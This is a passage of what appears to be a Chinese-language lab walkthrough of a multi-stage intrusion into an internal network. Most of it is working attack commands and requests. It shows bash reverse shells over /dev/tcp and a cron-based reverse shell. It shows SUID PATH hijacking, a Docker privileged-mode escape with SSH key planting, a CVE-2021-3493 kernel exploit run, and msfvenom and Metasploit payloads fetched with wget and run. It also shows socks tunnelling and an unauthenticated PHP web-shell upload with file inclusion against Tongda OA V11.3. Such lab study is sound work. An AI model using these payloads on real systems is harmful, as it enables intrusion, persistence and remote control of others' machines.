+<p><img alt="截图" src="6cbf95a3a8c370d03d4d1acf28e64856.png" /></p>
+<p><img alt="截图" src="4e63cd2f2221f128c9f70de1442dcc4c.png" /></p>
+<p>成功进行连接，简单进行了信息收集，发现存在52段</p>
+<p><img alt="截图" src="f476f84710e8360f6e9fde862872c88c.png" /></p>
+<p>因为之前的shell反弹不了，所以看一下nginx的配置文件是不是做了反向代理</p>
+<blockquote>
+<p>proxy_pass http://192.168.52.20:8000;：将对根路径的请求代理转发到另一个服务器，地址为http://192.168.52.20:8000。这样，Nginx将充当反向代理，将请求转发到该地址并返回响应。</p>
+<p>proxy_pass的存在意义在于实现请求的转发和负载均衡。具体作用包括：</p>
+<p>反向代理：Nginx接收来自客户端的请求，然后将这些请求转发到指定的后端服务器（如http://192.168.52.20:8000），隐藏后端服务器的真实地址。</p>
+<p>负载均衡：可以将请求分发到多台后端服务器，以平衡负载，提高服务的可用性和响应速度。</p>
+</blockquote>
+<p><br/></p>
+<p><img alt="截图" src="7c2ed5494db45b6ee193840872d26c44.png" /></p>
+<p>81端口的反弹不到kali，只能麻烦一点使用ubuntu做为跳板机进行操作.</p>
+<p>首先进行反弹shell到ubuntu:192.168.52.10</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/4444 &lt;&amp;1&#39;
+</code></pre></div>
+<p><img alt="截图" src="00cfd04a6fad2669187989de37a93a6b.png" /></p>
+<p>当前权限为www，先进行提权</p>
+<h2 id="_2">环境变量提权<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>发现是docker环境。</p>
+<p><img alt="截图" src="833a390a07499d26ab43e617625d8069.png" /></p>
+<p>不知道是不是因为docker环境的原因，尝试内核提权失败。既然如此，就尝试搜索寻找带有SUID的文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>find / -perm -u=s -type f 2&gt;/dev/null
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>find / -user root -perm -4000 -print 2&gt;/dev/null
+</code></pre></div>
+<p><img alt="截图" src="830d36948cf925e9e87df53ac38253af.png" /></p>
+<p>发现home目录下的那个shell有点可疑，先执行看看会发生什么</p>
+<p><img alt="截图" src="243822504a1a75d87d77598462fc2764.png" /></p>
+<p>通过执行发现该脚本执行了<code>ps</code>命令且并未使用绝对路径，源码在demo.c中可以清楚看到。</p>
+<p>那么我们尝试更改$PATH来执行我们的恶意程序，从而获得目标主机的高权限shell</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>cd /tmp
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>echo &quot;/bin/bash&quot; &gt; ps  //创建一个名为ps的文件，并在其中写入/bin/bash，这个文件会成为一个可执行脚本。
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>chmod 777 ps
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>echo $PATH     //输出当前的环境变量PATH，显示系统查找可执行文件的路径。
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>export PATH=/tmp:$PATH //将/tmp添加到环境变量中，并且先加载执行/tmp里的程序
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>cd /home/jobs
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>./shell
+</code></pre></div>
+<p><img alt="截图" src="3cfd40a204db1bbe5e7a4503d237efef.png" /></p>
+<p>成功获得root权限，把shell再反弹到ubuntu(web 1)中</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/192.168.52.10/5555 &lt;&amp;1&#39;
+</code></pre></div>
+<p><img alt="截图" src="2b9f0859543c1e062e8f69ed82edf573.png" /></p>
+<p>前面说到这是个docker环境，实际IP为192.168.52.20，所以我们要进行docker逃逸</p>
+<h2 id="docker">Docker特权模式逃逸<a class="headerlink" href="#docker" title="Permanent link">&para;</a></h2>
+<h3 id="_3">原理<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行<code>docker run —privileged</code>时，Docker容器将被允许访问主机上的所有设备，并可以执行<code>mount</code>命令进行挂载</p>
+<h3 id="_4">漏洞利用<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>fdisk -l #查看磁盘文件
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>ls /dev #查看设备文件
+</code></pre></div>
+<p><img alt="截图" src="ff1c0c90ce8cbce5d23e68ca08948db9.png" /></p>
+<p>有三个磁盘文件和N个设备文件，我们将/dev/sda1挂载到自己创建的文件夹</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>mkdir hello
+<a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>mount /dev/sda1 /hello
+<a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>ls /hello
+</code></pre></div>
+<p><img alt="截图" src="11d0473e4016bd7030e65ceab923861a.png" /></p>
+<p>挂载成功，写入计划任务</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/192.168.52.10/2333 0&gt;&amp;1&#39; &gt;&gt; /hello/var/spool/cron/root
+</code></pre></div>
+<p><img alt="截图" src="0e1fb72ceabe56549ae480c97e6ac357.png" /></p>
+<p>没有反应0.0</p>
+<p>换另一个思路，翻一下看看可不可以访问root目录或查看home有没有用户</p>
+<p><img alt="截图" src="18329fba67a262d9e2c8313245d3ca3d.png" /></p>
+<p>可以看到有ubuntu这个用户</p>
+<p>接下来就可以将我们自己生成的ssh秘钥写入到/hello/home/ubuntu/.ssh目录中的authorized_keys文件中，写入成功之后就可以使用该密钥进行登陆该机器</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>ssh-keygen -f hello
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>chmod 600 hello #赋予权限
+</code></pre></div>
+<p><img alt="截图" src="d2287cd2602d79c8fee761274edee7f0.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>cp -avx /hello/home/ubuntu/.ssh/id_rsa.pub /hello/home/ubuntu/.ssh/authorized_keys #-avx是将权限也一起复制
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>echo &gt; /hello/home/ubuntu/.ssh/authorized_keys #清空authorized_keys文件
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>echo &#39;生成的.pub文件的内容&#39; &gt; /hello/home/ubuntu/.ssh/authorized_keys #将ssh秘钥写入authorized_keys文件
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>cat /hello/home/ubuntu/.ssh/authorized_keys #查看是否写入成功
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a>ssh -i hello ubuntu@192.168.52.20
+</code></pre></div>
+<p><img alt="截图" src="f2d091051bb49e2b54fdfb6c99d235c4.png" /></p>
+<p>成功登录，查看了一下网络，发现还存在93网段</p>
+<p><img alt="截图" src="a34ac0dd8afd59d15de5ed7c183059db.png" /></p>
+<h2 id="cve-2021-3493">CVE-2021-3493<a class="headerlink" href="#cve-2021-3493" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>linux kernel一般指Linux内核。Linux是一种开源电脑操作系统内核。它是一个用C语言写成，符合POSIX标准的类Unix操作系统。
+linux内核中的overlayfs文件系统中没有正确地验证用户名称空间和底层文件系统中文件功能的设置。由于非特权用户名称空间和Ubuntu内核中允许非特权覆盖的补丁的组合，攻击者可以使用它来获得更高的特权。</p>
+</blockquote>
+<h3 id="_5">漏洞影响版本<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p>Ubuntu 20.10
+Ubuntu 20.04 LTS
+Ubuntu 18.04 LTS
+Ubuntu 16.04 LTS
+Ubuntu 14.04 ESM</p>
+<p><img alt="截图" src="074878a889f6109c7af9a51a8972ae49.png" /></p>
+<p>因为登录的是ubuntu用户，刚好今年ubuntu机器出了一个内核提权漏洞，该机器在影响范围内,先进行提权.</p>
+<p>进入到tmp目录</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>vim exploit.c #将下载的exploit.c的内容粘贴到该文件中
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>gcc exploit.c -o exploit #编译
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>chmod +x exploit
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>./exploit
+</code></pre></div>
+<p><img alt="截图" src="44b0bac13df1f65ee6f2ca2b20965f58.png" /></p>
+<p>Exp：https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c</p>
+<p>成功提权，那么接下来该将这两台机器上线MSF继续进攻内网了</p>
+<h1 id="_6">内网渗透<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h1>
+<p>至此已经拿下两台linux主机 . ubuntu1 和 ubuntu2 整理一下</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>ubuntu1
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>    ip：192.168.111.133  192.168.52.10
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>ubuntu2
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>    ip：192.168.52.20 192.168.93.10
+</code></pre></div>
+<p>先进行上线通过Redis拿到的机器(Web1)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>msfconsole 
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>use exploit/multi/script/web_delivery           
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>set target 7    # 选择目标系统            
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>set payload linux/x64/meterpreter/reverse_tcp            
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>set lhost 192.168.111.128           
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>set lport 2345   
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>set SRVPORT 8081
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a>run
+</code></pre></div>
+<p><img alt="截图" src="745b429b7f5378c6c9eb0f8facc854ed.png" /></p>
+<p>添加路由(这一步非常关键)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>run get_local_subnets  //这个命令用来识别并获取本地主机上可用的子网信息,它会列出当前系统的网络接口中所有可访问的子网
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>run autoroute -s 192.168.52.0 -n 255.255.255.0  //允许Metasploit在渗透测试中自动添加新的路由，指定可以通过目标主机访问的网络
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>run autoroute -p   //显示当前Metasploit中的路由表，列出所有可用的路由信息
+</code></pre></div>
+<p><img alt="截图" src="5083771b480dd67c59ae1b1ca7509c9f.png" /></p>
+<p><strong>因为在Web 1这台机器上通过尝试该机器安装有python3.6.9，那么我们可以将木马上传到Web 1，通过python3开启一个http服务，使用Web 2进行下载并运行我们的木马</strong></p>
+<p><img alt="截图" src="1ae2968f64b4eb4079577f4f0ca4969f.png" /></p>
+<p>首先MSF生成木马，通过MSF上传到Web 1中</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=2020 -f elf -o 20.elf
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>sessions 1
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>upload /home/tom/20.elf /tmp/20.elf
+</code></pre></div>
+<p><img alt="截图" src="1f62971246c16c142910692703937d32.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>root@ubuntu:/tmp# python3 -m http.server
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>------------------------------------------------------------------------------------------------------------
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>bash-4.3# wget http://192.168.52.10:8000/20.elf;chmod +x 20.elf;./20.elf
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>-------------------------------------------------------------------------------------------------------------
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>msf6 exploit(multi/script/web_delivery) &gt; use multi/handler
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/bind_tcp
+<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>payload =&gt; linux/x64/meterpreter/bind_tcp
+<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>msf6 exploit(multi/handler) &gt; show options
+<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>
+<a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>Module options (exploit/multi/handler):
+<a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>
+<a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>   Name  Current Setting  Required  Description
+<a id="__codelineno-24-13" name="__codelineno-24-13" href="#__codelineno-24-13"></a>   ----  ---------------  --------  -----------
+<a id="__codelineno-24-14" name="__codelineno-24-14" href="#__codelineno-24-14"></a>
+<a id="__codelineno-24-15" name="__codelineno-24-15" href="#__codelineno-24-15"></a>
+<a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a>Payload options (linux/x64/meterpreter/bind_tcp):
+<a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a>
+<a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a>   Name   Current Setting  Required  Description
+<a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a>   ----   ---------------  --------  -----------
+<a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a>   LPORT  2020             yes       The listen port
+<a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a>   RHOST  192.168.52.20    no        The target address
+<a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a>
+<a id="__codelineno-24-23" name="__codelineno-24-23" href="#__codelineno-24-23"></a>
+<a id="__codelineno-24-24" name="__codelineno-24-24" href="#__codelineno-24-24"></a>Exploit target:
+<a id="__codelineno-24-25" name="__codelineno-24-25" href="#__codelineno-24-25"></a>
+<a id="__codelineno-24-26" name="__codelineno-24-26" href="#__codelineno-24-26"></a>   Id  Name
+<a id="__codelineno-24-27" name="__codelineno-24-27" href="#__codelineno-24-27"></a>   --  ----
+<a id="__codelineno-24-28" name="__codelineno-24-28" href="#__codelineno-24-28"></a>   0   Wildcard Target
+<a id="__codelineno-24-29" name="__codelineno-24-29" href="#__codelineno-24-29"></a>
+<a id="__codelineno-24-30" name="__codelineno-24-30" href="#__codelineno-24-30"></a>
+<a id="__codelineno-24-31" name="__codelineno-24-31" href="#__codelineno-24-31"></a>
+<a id="__codelineno-24-32" name="__codelineno-24-32" href="#__codelineno-24-32"></a>View the full module info with the info, or info -d command.
+<a id="__codelineno-24-33" name="__codelineno-24-33" href="#__codelineno-24-33"></a>
+<a id="__codelineno-24-34" name="__codelineno-24-34" href="#__codelineno-24-34"></a>msf6 exploit(multi/handler) &gt; exploit
+</code></pre></div>
+<p><img alt="截图" src="a86657342523eea5f17dde0bae5e0fac.png" /></p>
+<p><img alt="截图" src="cc70b1184d6c9b252c4e2e561866e5bf.png" /></p>
+<p>成功上线192.168.52.20(web2).</p>
+<p>目前拿下了web1和web2</p>
+<p><img alt="截图" src="8c8630e01549cfc4b79266874b4fe976.png" /></p>
+<h2 id="socks5">路由与socks5代理<a class="headerlink" href="#socks5" title="Permanent link">&para;</a></h2>
+<p>我们获取了两个sessions，因为kali无法与52段的主机进行通信，所以我们需要在web1上增加一条去往192.168.52.0的路由</p>
+<p><img alt="截图" src="43e500f39283ccbfd4ba80999afae361.png" /></p>
+<p>路由转发只能将msfconsole带进内网，而要想将攻击机上的其他攻击程序也带进内网还需要搭建socks代理。我们使用earthworm搭建socks5反向代理服务。</p>
+<p>在攻击机上执行如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>./ew_for_linux64 -s rcsocks -l 2080 -e 5678
+</code></pre></div>
+<p><img alt="截图" src="3197b98c05eed6cd92346b5d98aed1c4.png" /></p>
+<p>在DMZ区域的Web1上传ew_for_linux64，通过执行如下命令实现：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>sessions 1
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>upload /home/tom/ew_for_linux64 /tmp/ew_for_linux64
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>nohup ./ew_for_linux64 -s rssocks -d 192.168.111.128 -e 5678
+</code></pre></div>
+<p><img alt="截图" src="d528f8ab6af38f361afb9c2e71902713.png" /></p>
+<p><img alt="截图" src="008980ccd8b2af30f79ab5c7408a9757.png" /></p>
+<p>配置成功：</p>
+<p><img alt="截图" src="60eb03adee9106e4c9618e59dc407252.png" /></p>
+<p>然后配置proxychains，将socks5服务器指向127.0.0.1:2080，之后便可以使用proxychains将我们攻击机上的程序代理进第二层网络（192.168.52.1/24）了。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>vim /etc/proxychains4.conf   
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>socks5 127.0.0.1 2080
+</code></pre></div>
+<p><img alt="截图" src="7fb49065c4324a29681101acb6dd8536.png" /></p>
+<p>接着，我们使用metasploit的 auxiliary/scanner/discovery/udp_probe 模块来扫描第二层网络中的主机存活：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>use auxiliary/scanner/discovery/udp_probe
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>set rhosts 192.168.52.1-254            //注意必须是254，不能是255
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>set threads 5
+<a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>run
+</code></pre></div>
+<blockquote>
+<p>192.168.52.255 是广播地址，不是单个主机的 IP，广播地址用于将数据包发送给子网中的所有设备，通常不用于单独的通信。一些工具（包括 Metasploit）在扫描时会尝试对整个 IP 范围发送探测请求，而对广播地址发送的请求通常无效或被阻止。</p>
+</blockquote>
+<p><img alt="截图" src="d73f27ea01f5047e881657e1b7d15945.png" /></p>
+<p>我们发现了30主机，接下来我们使用proxychains4 进一步对30主机的端口进行扫描</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>proxychains4  -f /etc/proxychains4.conf nmap -Pn -sT -sV -F -O 192.168.52.30
+</code></pre></div>
+<blockquote>
+<p>使用<code>proxychains4   nmap -Pn -sT -sV -F -O 192.168.52.30</code>会失败，并且显示使用的是1080端口，所以在这里我们指定配置文件就不会报错了。</p>
+</blockquote>
+<p><img alt="截图" src="0ceeaf1a8224b8638100a7c3c57b2d81.png" /></p>
+<p>我们发现了8080端口上有一个nginx的http服务，在攻击机的浏览器上设置好代理后，成功访问：</p>
+<p><img alt="截图" src="99ed9c648e3cffc75cf935b5b2fd54f0.png" /></p>
+<p>在kali上 访问192.168.52.30:8080</p>
+<p><img alt="截图" src="87d5b7f3201b594597d0f77002c61b15.png" /></p>
+<p>是个通达OA，经测试其版本为通达OA V11.3，该版本存在任意用户登录、文件包含和文件上传等多个漏洞。</p>
+<p>接下来我们下载一个代理插件，配置好代理，好让我们方便使用burpsuite进行抓包，</p>
+<p><img alt="截图" src="00d5aab0074f949b7399b9adab38c841.png" /></p>
+<p>由于其他端口的占用，这里使用8089.</p>
+<p>burpsuite要配置两个地方：</p>
+<p><img alt="截图" src="d29951c9103308ced25fd6c1c7e20c81.png" /></p>
+<p><img alt="截图" src="c2b9ccd89c17fa5527ce66e86fa9568e.png" /></p>
+<p>配好后打开代理，进行抓包，发现抓包成功，直接抓包，修改，未授权上传图片马 </p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>POST /ispirit/im/upload.php HTTP/1.1
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>Host: 192.168.52.30:8080
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Content-Length: 658
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>Cache-Control: no-cache
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>Accept: */*
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>Accept-Encoding: gzip, deflate
+<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a>Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5
+<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>Cookie: PHPSESSID=123
+<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a>Connection: close
+<a id="__codelineno-30-12" name="__codelineno-30-12" href="#__codelineno-30-12"></a>
+<a id="__codelineno-30-13" name="__codelineno-30-13" href="#__codelineno-30-13"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+<a id="__codelineno-30-14" name="__codelineno-30-14" href="#__codelineno-30-14"></a>Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;
+<a id="__codelineno-30-15" name="__codelineno-30-15" href="#__codelineno-30-15"></a>
+<a id="__codelineno-30-16" name="__codelineno-30-16" href="#__codelineno-30-16"></a>2
+<a id="__codelineno-30-17" name="__codelineno-30-17" href="#__codelineno-30-17"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+<a id="__codelineno-30-18" name="__codelineno-30-18" href="#__codelineno-30-18"></a>Content-Disposition: form-data; name=&quot;P&quot;
+<a id="__codelineno-30-19" name="__codelineno-30-19" href="#__codelineno-30-19"></a>
+<a id="__codelineno-30-20" name="__codelineno-30-20" href="#__codelineno-30-20"></a>123
+<a id="__codelineno-30-21" name="__codelineno-30-21" href="#__codelineno-30-21"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+<a id="__codelineno-30-22" name="__codelineno-30-22" href="#__codelineno-30-22"></a>Content-Disposition: form-data; name=&quot;DEST_UID&quot;
+<a id="__codelineno-30-23" name="__codelineno-30-23" href="#__codelineno-30-23"></a>
+<a id="__codelineno-30-24" name="__codelineno-30-24" href="#__codelineno-30-24"></a>1
+<a id="__codelineno-30-25" name="__codelineno-30-25" href="#__codelineno-30-25"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB
+<a id="__codelineno-30-26" name="__codelineno-30-26" href="#__codelineno-30-26"></a>Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;
+<a id="__codelineno-30-27" name="__codelineno-30-27" href="#__codelineno-30-27"></a>Content-Type: image/jpeg
+<a id="__codelineno-30-28" name="__codelineno-30-28" href="#__codelineno-30-28"></a>
+<a id="__codelineno-30-29" name="__codelineno-30-29" href="#__codelineno-30-29"></a>&lt;?php
+<a id="__codelineno-30-30" name="__codelineno-30-30" href="#__codelineno-30-30"></a>$command=$_POST[&#39;cmd&#39;];
+<a id="__codelineno-30-31" name="__codelineno-30-31" href="#__codelineno-30-31"></a>$wsh = new COM(&#39;WScript.shell&#39;);
+<a id="__codelineno-30-32" name="__codelineno-30-32" href="#__codelineno-30-32"></a>$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);
+<a id="__codelineno-30-33" name="__codelineno-30-33" href="#__codelineno-30-33"></a>$stdout = $exec-&gt;StdOut();
+<a id="__codelineno-30-34" name="__codelineno-30-34" href="#__codelineno-30-34"></a>$stroutput = $stdout-&gt;ReadAll();
+<a id="__codelineno-30-35" name="__codelineno-30-35" href="#__codelineno-30-35"></a>echo $stroutput;
+<a id="__codelineno-30-36" name="__codelineno-30-36" href="#__codelineno-30-36"></a>?&gt;
+<a id="__codelineno-30-37" name="__codelineno-30-37" href="#__codelineno-30-37"></a>------WebKitFormBoundarypyfBh1YB4pV8McGB--
+</code></pre></div>
+<p><img alt="截图" src="4d79ad79f172ea5664c60110aa10a757.png" /></p>
+<p>文件包含：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>POST /ispirit/interface/gateway.php HTTP/1.1
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>Host: 192.168.52.30:8080
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>Connection: keep-alive
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>Accept-Encoding: gzip, deflate
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a>Accept: */*
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a>User-Agent: python-requests/2.21.0
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a>Content-Length: 71
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a>Content-Type: application/x-www-form-urlencoded
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>
+<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a>json={&quot;url&quot;:&quot;/general/../../attach/im/2409/731126929.jpg&quot;}&amp;cmd=whoami
+</code></pre></div>
+<p><img alt="截图" src="b602ee0c97e432b54333a160f57d3ee2.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>POST /ispirit/interface/gateway.php HTTP/1.1
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>Host: 192.168.52.30:8080
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>Connection: keep-alive
+<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>Accept-Encoding: gzip, deflate
+<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>Accept: */*
+<a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>User-Agent: python-requests/2.21.0
+<a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a>Content-Length: 72
+<a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a>Content-Type: application/x-www-form-urlencoded
+<a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>
+<a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a>json={&quot;url&quot;:&quot;/general/../../attach/im/2409/1329251649.jpg&quot;}&amp;cmd=whoami
+</code></pre></div>
